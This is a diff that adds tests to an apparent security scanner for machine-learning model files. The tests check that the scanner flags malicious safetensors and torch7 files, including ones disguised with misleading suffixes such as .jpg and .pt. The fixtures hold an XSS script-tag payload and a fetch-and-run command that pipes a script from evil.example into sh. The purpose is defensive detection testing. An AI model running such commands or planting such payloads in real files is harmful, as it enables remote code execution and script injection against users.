@@ -1901,6 +1901,67 @@ def test_scan_file_does_not_route_gguf_magic_near_match_to_gguf(tmp_path: Path) 
     assert result.issues == []
 
 
+def test_scan_file_keeps_torch_marker_safetensors_on_safetensors_scanner(tmp_path: Path) -> None:
+    file_path = tmp_path / "torch-marker-metadata.safetensors"
+    header = {
+        "__metadata__": {
+            "framework": "torch",
+            "kind": "tensor nn.Sequential",
+            "description": "<script>alert('xss')</script>",
+        },
+        "t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
+    }
+    header_bytes = json.dumps(header, separators=(",", ":")).encode()
+    file_path.write_bytes(len(header_bytes).to_bytes(8, "little") + header_bytes + b"\x00" * 4)
+
+    result = scan_file(str(file_path))
+
+    assert result.scanner_name == "safetensors"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_scan_file_detects_malicious_torch7_with_misleading_suffix(tmp_path: Path) -> None:
+    disguised_torch7 = tmp_path / "payload.jpg"
+    disguised_torch7.write_bytes(
+        b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
+        b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+    )
+
+    result = scan_file(str(disguised_torch7))
+
+    assert result.scanner_name == "torch7"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+@pytest.mark.parametrize("filename", ["payload.onnx", "payload.pt", "payload.gz", "payload.tar.gz"])
+def test_scan_file_detects_malicious_torch7_with_recognized_misleading_suffix(
+    tmp_path: Path,
+    filename: str,
+) -> None:
+    disguised_torch7 = tmp_path / filename
+    disguised_torch7.write_bytes(
+        b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
+        b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+    )
+
+    result = scan_file(str(disguised_torch7))
+
+    assert result.scanner_name == "torch7"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_scan_file_does_not_route_torch_source_near_match_with_misleading_suffix(tmp_path: Path) -> None:
+    source_near_match = tmp_path / "source.jpg"
+    source_near_match.write_text("import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n")
+
+    result = scan_file(str(source_near_match))
+
+    assert result.scanner_name == "unknown"
+    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
 def test_scan_file_routes_extensionless_llamafile(tmp_path: Path) -> None:
     extensionless_llamafile = tmp_path / "llama"
     extensionless_llamafile.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime")
